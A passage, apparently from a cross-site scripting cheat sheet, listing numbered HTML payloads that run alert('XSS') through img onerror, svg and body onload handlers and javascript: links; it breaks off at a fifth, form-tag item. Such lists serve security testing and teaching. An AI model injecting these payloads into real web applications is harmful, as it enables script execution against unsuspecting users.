...
- 1. Image tag with error handler
```php
<img src="x" onerror="alert('XSS')">
```
- 2. SVG tag with load handler
```php
<svg onload="alert('XSS')">
```
- 3. Body tag with load handler
```php
<body onload="alert('XSS')">
```
- 4. Anchor tag with javascript: protocol 
```php
<a href="javascript:alert('XSS')">Click me</a>
```
- 5. Form tag with javascript: protocol
```php
